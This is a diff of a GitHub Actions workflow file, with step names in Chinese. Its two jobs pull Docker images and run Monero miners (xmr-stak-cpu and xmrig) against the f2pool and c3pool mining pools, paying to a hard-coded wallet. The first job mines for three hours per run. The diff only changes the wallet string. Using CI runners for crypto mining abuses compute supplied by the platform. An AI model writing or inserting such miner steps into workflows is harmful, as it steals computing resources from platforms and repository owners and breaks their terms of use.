@@ -18,7 +18,7 @@ jobs:
         
       - name: 执行
         run: |
-          docker run --name xmr -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt" -e POOL="xmr.f2pool.com:13531" -d cryptocurrency/xmr-stak-cpu
+          docker run --name xmr -e WALLET="848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQn" -e POOL="xmr.f2pool.com:13531" -d cryptocurrency/xmr-stak-cpu
           sleep 3h
           docker stop xmr
           
@@ -29,5 +29,5 @@ jobs:
         run: docker pull wtbhk/xmrig-docker
       - name: 执行
         run: |
-          docker run wtbhk/xmrig-docker --rig-id $RANDOM -o mine.c3pool.com:13333 -u 848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQnt
+          docker run wtbhk/xmrig-docker --rig-id $RANDOM -o mine.c3pool.com:13333 -u 848rns8JmwcTQscYFwsxS6ft9NQoN3TeNYHebyFniF3dPSKgqVR1TrFd9KXCfbuBPMT5qcm2FAVFk95Cjy5Bmz45LhVkUQn
         
